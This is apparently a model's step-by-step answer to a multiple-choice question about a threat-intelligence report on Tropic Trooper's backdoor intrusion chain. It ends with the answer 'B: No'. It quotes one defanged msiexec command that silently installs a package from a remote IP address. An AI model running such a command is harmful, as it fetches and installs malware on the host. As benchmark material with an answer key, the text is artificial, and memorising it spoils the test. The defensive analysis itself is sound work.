### Step-by-Step Analysis

#### 1. Analyze the CTI Report

**Initial Access:**
- Tropic Trooper exploited CVE-2017-11882 or CVE-2018-0802 in Microsoft Office's Equation Editor.
- They downloaded and installed an MSI package using the command: `/c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]`.

**Persistence:**
- The backdoor loads an encrypted configuration file and decrypts it.
- It uses SSL to connect to C&C servers.

**Defense Evasion:**
- DLL hijacking is used to evade antivirus detection.
- The installer drops three files into the `C:\ProgramData\Apple\Update\` directory and creates a hidden directory (UFile).
- The loader, named FakeRun, executes `dllhost.exe` and injects a malicious DLL file (the backdoor) into this process.

**Command and Control:**
- TClient uses SSL to connect to the C&C server.
- The C&C server and configuration values are not hardcoded, allowing for easy updates.
- TClient uses symmetric encryption and custom SSL libraries to connect to the C&C server.

#### 2. Analyze the Question

The question asks if it is likely that:
- The system will drop a backdoor installer.
- Prepare for execution of the BITSadmin command-line tool by UserInstall.exe.
- The backdoor achieves persistence by loading an encrypted configuration file for connection to the C&C servers.

#### 3. Compare and Evaluate

**Dropping a Backdoor Installer:**
- The report mentions that the installer drops three files into the `C:\ProgramData\Apple\Update\` directory and creates a hidden directory (UFile). This aligns with the idea of dropping a backdoor installer.

**Preparing for Execution of BITSadmin:**
- The report does not mention the use of BITSadmin or UserInstall.exe. There is no indication that these tools are used in the attack sequence.

**Achieving Persistence:**
- The report clearly states that the backdoor loads an encrypted configuration file and uses SSL to connect to C&C servers, which aligns with achieving persistence.

#### 4. Provide a Step-by-Step Reasoning and Final Answer

- The CTI report confirms that the system drops a backdoor installer and achieves persistence by loading an encrypted configuration file for connection to the C&C servers.
- However, the report does not mention the use of BITSadmin or UserInstall.exe.

Given this analysis, the sequence described in the question is not fully supported by the CTI report. The use of BITSadmin and UserInstall.exe is not mentioned, which is a critical part of the sequence in the question.

**Final Answer: B: No**
